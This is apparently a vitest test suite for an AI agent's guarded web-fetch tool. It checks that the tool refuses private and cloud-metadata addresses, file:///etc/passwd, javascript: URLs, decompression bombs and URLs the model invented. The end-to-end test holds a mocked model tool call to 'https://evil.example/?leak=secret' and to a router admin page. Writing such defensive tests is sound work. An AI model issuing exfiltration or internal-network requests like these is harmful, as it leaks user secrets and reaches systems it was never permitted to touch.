import { mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { gzipSync } from 'node:zlib';
import { afterEach, describe, expect, it } from 'vitest';
import { checkUrl, isPublicAddress, vetHost, WebRefusal, type AddressPolicy } from '../src/web/policy.js';
import { guardedGet } from '../src/web/fetch.js';
import { bound, extractHtml, htmlTypes, textTypes } from '../src/web/extract.js';
import { agentBrowserRead, findAgentBrowser, nativeName, withMirror, type Runner } from '../src/web/agent-browser.js';
import { MAX_READS, resetWebCaches, WebController } from '../src/web/controller.js';
import { Evidence, READS_SPENT } from '../src/routing/escalation.js';
import { describeTool } from '../src/presentation.js';
import { shortUrl } from '../src/agents/run.js';
import { runHost } from '../src/host.js';
import { completion, fixture, jev, mockServer } from './helpers.js';

const cleanup: Array<() => Promise<void>> = [];
afterEach(async () => { for (const fn of cleanup.splice(0).reverse()) await fn(); resetWebCaches(); });

/** `*.test` names resolve to the mock server; private.test and mixed.test resolve where they say. */
const local: AddressPolicy = {
  lookup: async host => host === 'private.test' ? [{ address: '10.0.0.5', family: 4 }] : host === 'mixed.test' ? [{ address: '8.8.8.8', family: 4 }, { address: '192.168.1.1', family: 4 }] : [{ address: '127.0.0.1', family: 4 }],
  allowAddress: address => address === '127.0.0.1' || isPublicAddress(address),
  allowPort: () => true,
};
const types = [...htmlTypes, ...textTypes];

describe('address and URL policy', () => {
  it.each([
    ['8.8.8.8', true], ['1.1.1.1', true], ['2606:4700:4700::1111', true],
    ['127.0.0.1', false], ['10.1.2.3', false], ['172.20.0.1', false], ['192.168.0.10', false], ['169.254.169.254', false], ['100.100.100.100', false],
    ['0.0.0.0', false], ['224.0.0.1', false], ['255.255.255.255', false], ['198.18.0.1', false],
    ['::1', false], ['::', false], ['fe80::1', false], ['fd00::1', false], ['ff02::1', false], ['2001:db8::1', false], ['::7f00:1', false],
    ['::ffff:127.0.0.1', false], ['::ffff:7f00:1', false], ['::ffff:808:808', true], ['64:ff9b::a00:1', false], ['64:ff9b::808:808', true],
    ['not-an-ip', false],
  ])('%s public: %s', (address, expected) => expect(isPublicAddress(address)).toBe(expected));

  it.each([
    'http://localhost/', 'http://printer.local/', 'http://db.internal/', 'http://intranet/', 'http://127.0.0.1/', 'http://2130706433/', 'http://0x7f.1/',
    'http://[::1]/', 'http://[::ffff:127.0.0.1]/', 'http://169.254.169.254/latest/meta-data/', 'http://example.com:8080/', 'file:///etc/passwd',
    'ftp://example.com/', 'http://user:pass@example.com/', 'javascript:alert(1)',
  ])('refuses %s', url => expect(() => checkUrl(url)).toThrow(WebRefusal));

  it('accepts ordinary pages and drops the fragment', () => {
    expect(checkUrl('https://en.wikipedia.org/wiki/Sabacc#Kessel').href).toBe('https://en.wikipedia.org/wiki/Sabacc');
    expect(checkUrl('http://example.com:80/a?b=1').href).toBe('http://example.com/a?b=1');
  });

  it('refuses names that resolve to any private address', async () => {
    await expect(vetHost('private.test', local)).rejects.toThrow('local or private');
    await expect(vetHost('mixed.test', { ...local, allowAddress: isPublicAddress })).rejects.toThrow('local or private');
    await expect(vetHost('example.test', { lookup: async () => [] })).rejects.toThrow('Could not resolve');
    expect(await vetHost('8.8.8.8')).toEqual({ address: '8.8.8.8', family: 4 });
  });
});

describe('guarded fetch', () => {
  const serve = async () => {
    const hits: string[] = [];
    const server = await mockServer((_body, req, res) => {
      hits.push(req.url!);
      const port = new URL(`http://${req.headers.host}`).port;
      const redirect = (location: string) => { res.writeHead(302, { location }); res.end(); };
      if (req.url === '/page') { res.setHeader('content-type', 'text/html; charset=utf-8'); res.end('<title>Page</title><p>hello</p>'); }
      else if (req.url === '/hop') redirect('/page');
      else if (req.url === '/to-metadata') redirect('http://169.254.169.254/latest/meta-data/');
      else if (req.url === '/to-private-name') redirect(`http://private.test:${port}/page`);
      else if (req.url === '/loop') redirect('/loop');
      else if (req.url === '/pdf') { res.setHeader('content-type', 'application/pdf'); res.end('%PDF'); }
      else if (req.url === '/bomb') { res.writeHead(200, { 'content-type': 'text/plain', 'content-encoding': 'gzip' }); res.end(gzipSync(Buffer.alloc(3_000_000, 97))); }
      else if (req.url === '/slow') { /* never answers */ }
      else { res.writeHead(404); res.end(); }
    });
    cleanup.push(server.close);
    return { base: server.url.replace('127.0.0.1', 'site.test'), hits };
  };

  it('follows redirects and checks each hop', async () => {
    const { base, hits } = await serve();
    const page = await guardedGet(`${base}/hop`, { ...local, types });
    expect(page).toMatchObject({ url: `${base}/page`, status: 200, contentType: 'text/html', charset: 'utf-8' });
    expect(page.body.toString()).toContain('hello');
    await expect(guardedGet(`${base}/to-metadata`, { ...local, types })).rejects.toThrow('Local and private');
    await expect(guardedGet(`${base}/to-private-name`, { ...local, types })).rejects.toThrow('local or private');
    await expect(guardedGet(`${base}/loop`, { ...local, types })).rejects.toThrow('Stopped after 5 redirects');
    expect(hits.filter(hit => hit === '/loop')).toHaveLength(6);
  });

  it('refuses other content types, oversized bodies after decompression, and slow pages', async () => {
    const { base } = await serve();
    await expect(guardedGet(`${base}/pdf`, { ...local, types })).rejects.toThrow('Unsupported content type (application/pdf)');
    await expect(guardedGet(`${base}/bomb`, { ...local, types })).rejects.toThrow('larger than 2 MB');
    await expect(guardedGet(`${base}/slow`, { ...local, types, limits: { deadlineMs: 300 } })).rejects.toThrow('took too long');
    expect((await guardedGet(`${base}/missing`, { ...local, types })).status).toBe(404);
  });
});

describe('extraction', () => {
  it('keeps the main content as markdown with absolute links', () => {
    const html = `<html><head><title>Kessel &amp; Co</title><style>p{}</style></head><body>
      <nav><a href="/home">Home</a> menu</nav><header>Site</header>
      <main><h1>Rules</h1><p>Two decks of <b>62&nbsp;cards</b>, see <a href="/dice#top">the dice</a>.</p>
      <ul><li>Sand</li><li>Blood</li></ul><table><tr><th>Hand</th><th>Rank</th></tr><tr><td>Sabacc</td><td>1</td></tr></table>
      <pre>  keep   spacing</pre><script>alert(1)</script></main><footer>© 2026</footer></body></html>`;
    const page = extractHtml(html, 'https://example.com/games/kessel');
    expect(page.title).toBe('Kessel & Co');
    expect(page.text).toContain('# Rules');
    expect(page.text).toContain('Two decks of 62 cards, see [the dice](https://example.com/dice).');
    expect(page.text).toContain('- Sand\n- Blood');
    expect(page.text).toContain('Hand | Rank\nSabacc | 1');
    expect(page.text).toContain('```\n  keep   spacing\n```');
    expect(page.text).not.toMatch(/menu|alert|© 2026|Home/);
    expect(page.links).toEqual(['https://example.com/dice']);
  });

  it('cuts at a paragraph break and never through an emoji', () => {
    expect(bound(`${'a'.repeat(80)}\n\n${'b'.repeat(40)}`, 100)).toEqual({ text: `${'a'.repeat(80)}\n[truncated]`, truncated: true });
    expect(bound(`${'x'.repeat(9)}😀${'y'.repeat(20)}`, 22).text).toBe(`${'x'.repeat(9)}\n[truncated]`);
    expect(bound('z'.repeat(50), 30).text.length).toBeLessThanOrEqual(30);
  });
});

describe('agent-browser', () => {
  it('only ever reaches the page and its .md variant through the mirror', async () => {
    const seen: Array<[string, number]> = [];
    const run: Runner = async (_bin, args) => {
      const url = args[1]!;
      for (const probe of [url, `${url}.md`, `${url}/llms.txt`, url.replace(/\/[^/]+$/, '/llms.txt'), url.replace(/\/[^/]+$/, '/other')]) {
        const response = await fetch(probe); seen.push([probe.slice(url.length - 32) || probe, response.status]);
      }
      expect(args).toEqual(expect.arrayContaining(['--json', '--session', 'teapilot', '--namespace', 'teapilot', '--config']));
      return JSON.stringify({ success: true, data: { content: '# From markdown', source: 'markdown' }, error: null });
    };
    const state = await mkdtemp(join(tmpdir(), 'teapilot-web-')); cleanup.push(() => rm(state, { recursive: true, force: true }));
    let variants = 0;
    const result = await withMirror({ contentType: 'text/html', text: '<p>page</p>' }, async () => { variants++; return { contentType: 'text/markdown', text: '# md' }; },
      url => agentBrowserRead('agent-browser', url, state, { run }));
    expect(result).toEqual({ content: '# From markdown', source: 'markdown' });
    expect(seen.map(([, status]) => status)).toEqual([200, 200, 404, 404, 404]);
    expect(variants).toBe(1);
  });

  it('never runs the npm launchers', async () => {
    const dir = await mkdtemp(join(tmpdir(), 'teapilot-ab-')); cleanup.push(() => rm(dir, { recursive: true, force: true }));
    await writeFile(join(dir, 'agent-browser.cmd'), '@echo off');
    await writeFile(join(dir, 'agent-browser.js'), '');
    expect(await findAgentBrowser(dir, join(dir, 'agent-browser.cmd'))).toBeUndefined();
    expect(await findAgentBrowser(dir, join(dir, 'agent-browser.js'))).toBeUndefined();
    await writeFile(join(dir, nativeName()!), '');
    expect(await findAgentBrowser(dir, join(dir, 'agent-browser.js'))).toBe(join(dir, nativeName()!));
    expect(nativeName('win32', 'arm64')).toBeUndefined();
    expect(nativeName('linux', 'x64', true)).toBe('agent-browser-linux-musl-x64');
  });
});

describe('web controller', () => {
  const site = async () => {
    const hits: string[] = [];
    const server = await mockServer((_body, req, res) => {
      hits.push(req.url!);
      if (req.url === '/search?q=kessel&format=json') { res.end(JSON.stringify({ results: [{ title: 'Rules', url: `${base}/rules`, content: 'snippet' }] })); return; }
      res.setHeader('content-type', 'text/html');
      res.end(`<title>${req.url}</title><main><p>Page ${req.url} with a <a href="/second">second page</a>.</p></main>`);
    });
    cleanup.push(server.close);
    const base = server.url.replace('127.0.0.1', 'site.test');
    const f = await fixture(); cleanup.push(f.cleanup);
    f.config.webReader = { mode: 'builtin' };
    const events: Array<[string, Record<string, unknown>]> = [];
    const web = new WebController(f.config, { ...local, event: async (type, fields) => { events.push([type, fields]); } });
    return { base, hits, web, events, server };
  };

  it('reads only URLs that appeared in the conversation', async () => {
    const { base, hits, web, events } = await site();
    const invented = await web.read(`${base}/secret?data=abc`, 4000);
    expect(invented.text).toMatch(/^Not read: that URL has not appeared/);
    expect(hits).toEqual([]);
    web.remember(`the user wrote ${base}/first.`);
    const first = await web.read(`${base}/first`, 4000);
    expect(first.text).toContain(`Source: ${base}/first\nTitle: /first\n<<<untrusted page content>>>`);
    expect(first.text).toContain(`[second page](${base}/second)`);
    // A link from a page already read may be followed.
    expect((await web.read(`${base}/second`, 4000)).text).toContain('Page /second');
    expect(events.every(([, fields]) => !JSON.stringify(fields).includes('data=abc'))).toBe(true);
  });

  it('keeps parentheses that belong to a URL, written plainly or percent-encoded', async () => {
    const { base, web } = await site();
    web.remember(`see ${base}/World_1-1_(Super_Mario_Bros.) for the layout`);
    expect((await web.read(`${base}/World_1-1_(Super_Mario_Bros.)`, 4000)).text).toContain('Source:');
    expect((await web.read(`${base}/World_1-1_%28Super_Mario_Bros.%29`, 4000)).text).toContain('Source:');
    // An unmatched parenthesis still ends a URL, as in prose: (see https://host/page).
    web.remember(`(see ${base}/aside)`);
    expect((await web.read(`${base}/aside`, 4000)).text).toContain('Source:');
    expect((await web.read(`${base}/World_1-1_`, 4000)).text).toMatch(/^Not read: that URL has not appeared/);
  });

  it('allows search results, caches pages and stops at the read budget', async () => {
    const { base, hits, web, server } = await site();
    await web.search(server.url, 'kessel');
    expect((await web.read(`${base}/rules`, 4000)).text).toContain('Page /rules');
    await web.read(`${base}/rules`, 4000);
    expect(hits.filter(hit => hit === '/rules')).toHaveLength(1);
    for (let index = 0; index < MAX_READS; index++) web.remember(`${base}/p${index}`);
    const results = [];
    for (let index = 0; index < MAX_READS; index++) results.push((await web.read(`${base}/p${index}`, 4000)).text);
    expect(results.at(-1)).toMatch(new RegExp(`^${READS_SPENT}`));
    expect(results.slice(0, -1).every(text => text.startsWith('Source:'))).toBe(true);
  });

  it('bounds a long page to the limit it is given', async () => {
    const { base, web } = await site();
    web.remember(`${base}/x`);
    const page = await web.read(`${base}/x`, 30);
    expect(page.chars).toBeLessThanOrEqual(30);
    expect(page.text).toContain('Showing the first');
    // The whole page comes back too, shown in full or not, so the reader can keep it.
    expect(page.full).toMatchObject({ truncated: true, text: expect.stringContaining('Page /x') });
    expect((await web.read(`${base}/x`, 4000)).full).toMatchObject({ truncated: false });
  });
});

describe('agent integration', () => {
  it('withdraws web_read when reads repeat or the budget is spent', () => {
    const evidence = new Evidence({ maxEscalations: 3, consecutiveFailures: 2, repeatedToolCalls: 3 });
    for (let index = 0; index < 3; index++) evidence.observe('web_read', { url: 'https://a.example/' }, false, 'Source: same');
    expect(evidence.warning).toContain('Repeated reads');
    evidence.observe('web_read', { url: 'https://a.example/' }, false, 'Source: same');
    expect(evidence.readsExhausted).toBe(true);
    expect(evidence.reason).toBeUndefined();
    const spent = new Evidence({ maxEscalations: 3, consecutiveFailures: 2, repeatedToolCalls: 3 });
    spent.observe('web_read', {}, false, `${READS_SPENT}. Answer from what you already have.`);
    expect(spent.readsExhausted).toBe(true);
  });

  it('shows what is being read', () => {
    expect(shortUrl('https://en.wikipedia.org/wiki/Sabacc?token=secret')).toBe('en.wikipedia.org/wiki/Sabacc?…');
    expect(describeTool({ type: 'tool_execution_end', tool: 'web_read', url: 'example.com/rules' })).toBe('web_read example.com/rules');
  });

  it('offers web_read beside search and refuses private and invented URLs end to end', async () => {
    const f = await fixture(); cleanup.push(f.cleanup);
    const results: string[] = [];
    let calls = 0;
    const server = await mockServer((body, req, res) => {
      if (req.url === '/jev') jev(res, 'ask.normal');
      else if (req.url?.endsWith('/models')) res.end('{}');
      else if (req.url?.startsWith('/search?')) res.end(JSON.stringify({ results: [{ title: 'Router', url: 'http://192.168.1.1/admin', content: 'panel' }] }));
      else {
        const last = body.messages?.at(-1);
        if (last?.role === 'tool') results.push(String(last.content));
        calls++;
        if (calls === 1) {
          expect(body.tools.map((tool: any) => tool.function.name)).toEqual(['web_search', 'web_read', 'request_escalation']);
          completion(res, { tool: { name: 'web_search', arguments: { query: 'router' } } });
        } else if (calls === 2) completion(res, { tool: { name: 'web_read', arguments: { url: 'http://192.168.1.1/admin' } } });
        else if (calls === 3) completion(res, { tool: { name: 'web_read', arguments: { url: 'https://evil.example/?leak=secret' } } });
        else completion(res, { text: 'Could not open those.' });
      }
    }); cleanup.push(server.close);
    Object.assign(f.config.router, { endpoint: `${server.url}/jev` });
    for (const model of [f.config.models.fast, f.config.models.capable]) model.baseUrl = `${server.url}/v1`;
    f.config.searchUrl = server.url;
    const result = await runHost(f.config, { cwd: f.cwd, prompt: 'look up my router', web: true }, { approve: async () => false });
    expect(result.success).toBe(true);
    expect(results[1]).toContain('Local and private network addresses are never read');
    expect(results[2]).toContain('has not appeared in this conversation');
  });
});
